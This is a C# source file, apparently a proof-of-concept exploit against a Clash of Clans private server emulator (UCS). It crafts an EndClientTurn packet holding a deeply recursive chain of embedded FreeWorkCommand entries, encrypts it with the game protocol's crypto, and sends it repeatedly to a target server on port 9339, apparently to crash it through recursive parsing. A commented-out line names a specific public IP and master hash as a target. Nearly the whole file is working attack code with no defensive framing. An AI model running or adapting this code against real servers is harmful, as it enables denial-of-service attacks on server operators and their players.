using CoCSharp.Networking;
using System;
using System.IO;
using System.Net;
using System.Threading;
using UCS.Exploit.Cli;
using UCS.Exploit.Client;

namespace UCS.Exploit
{
    public class Program
    {
        public static CoCClient Client { get; set; }
        public static CliParser Parser { get; set; }

        public static void Main(string[] args)
        {
            //args = new string[]
            //{
            //    "-s", "1000", "-m", "f6d70976c986a10f9c5984b146cd6b6a4d3c61e2", "89.36.213.145"
            //};

            Parser = new CliParser();
            Client = new CoCClient();

            var ip = Parser.Parse(args);

            Console.WriteLine("[*] crafting recursive data with {0} depth recursion...", Parser.Size);
            var recursiveData = (byte[])null;
            using (var writer = new PacketWriter(new MemoryStream()))
            {
                RecursiveWrite(writer, Parser.Size);
                recursiveData = ((MemoryStream)writer.BaseStream).ToArray();
            }
            Console.WriteLine("[*] done crafting recursive data of {0} bytes long\n", recursiveData.Length);
            Console.WriteLine("[*] connecting to {0} with masterhash {1}...", ip, Parser.MasterHash);

            Client.MasterHash = Parser.MasterHash;
            Client.Connect(new IPEndPoint(IPAddress.Parse(ip), 9339));

            while (true)
            {
                if (Client.LoggedIn)
                {
                    Console.ReadKey(true);
                    Console.WriteLine("[*] crafting message...");
                    var body = new byte[recursiveData.Length + (4 + 4 + 4)]; // sizeof(subtick) + sizeof(checksum) + sizeof(commandcount).
                    using (var writer = new PacketWriter(new MemoryStream()))
                    {
                        // Write EndClientTurn Body.
                        writer.WriteInt32(1337); // Subtick
                        writer.WriteInt32(1337); // Checksum
                        writer.WriteInt32(1); // CommandCount, only command which it self embeds the other commands.
                        writer.Write(recursiveData, 0, recursiveData.Length);
                        body = ((MemoryStream)writer.BaseStream).ToArray();
                    }

                    Console.WriteLine("[*] \tencrypting message body {0} bytes long", body.Length);
                    // Encrypt the message so that it can be decrypted properly.
                    Client.NetworkManager.CoCCrypto.Encrypt(body);

                    var packet = new byte[body.Length + 7]; // sizeof(header)
                    using (var writer = new PacketWriter(new MemoryStream()))
                    {
                        // Write header.
                        writer.WriteUInt16(14102); // EndClientTurn Message ID
                        writer.WriteInt24(body.Length); // Message Length
                        writer.WriteUInt16(0); // Message Version(Unknown)

                        writer.Write(body, 0, body.Length);
                        packet = ((MemoryStream)writer.BaseStream).ToArray();
                    }
                    Console.WriteLine("[*] \tdone crafting message", body);

                    Client.Connection.Send(packet);
                    Console.WriteLine("[+] \tsent crafted packet of {0} bytes long", packet.Length);
                }

                Thread.Sleep(100);
            }
        }

        private static void RecursiveWrite(PacketWriter writer, int depth)
        {
            // Could have used a for loop but nehhh.
            if (depth < 0)
                return;

            writer.WriteInt32(521); // FreeWorkCommand ID

            writer.WriteInt32(1337); // m_vTimeLeftSeconds
            writer.WriteBoolean(true); // m_vIsCommandEmbedded
            depth -= 1;

            RecursiveWrite(writer, depth);
        }
    }
}
